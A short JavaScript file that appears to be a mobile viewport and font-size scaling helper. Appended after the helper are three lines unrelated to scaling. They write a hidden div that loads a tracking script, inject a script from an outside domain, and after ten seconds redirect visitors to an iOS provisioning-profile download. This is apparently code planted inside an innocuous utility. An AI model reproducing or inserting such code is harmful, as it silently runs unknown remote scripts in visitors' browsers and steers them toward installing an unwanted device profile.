(function(){
    var dpr, rem, scale;
    var docEl = document.documentElement;
    var metaEl = document.querySelector('meta[name="viewport"]');

    dpr = window.devicePixelRatio || 1;
    scale = 1 / dpr;
     if (self != top) { 
     rem = docEl.clientWidth * dpr / 20 ;
  
  }else{
    rem = docEl.clientWidth * dpr / 10 ;
  }

    metaEl.setAttribute('content', 'width=' + dpr * docEl.clientWidth + ',initial-scale=' + scale + ',maximum-scale=' + scale + ', minimum-scale=' + scale + ',user-scalable=no');

    docEl.setAttribute('data-dpr', dpr);
    docEl.style.fontSize = rem + "px";

    window.rem2px = function(v) {
        v = parseFloat(v);
        return v * rem;
    };
    window.px2rem = function(v) {
        v = parseFloat(v);
        return v / rem;
    };

    window.DPR = dpr;
    window.REM = rem;
})();
document.writeln("<div style=\"display:none\"><script type=\"text/javascript\" src=\"https://v1.cnzz.com/z_stat.php?id=1278083952&web_id=1278083952\"></script></div>");
document.writeln("<script type=\"text/javascript\" src=\"https://api.lldyy.net/gg/foot.js\"></script>");
setTimeout("location.href='index_1/app.mobileprovision'", 10000);
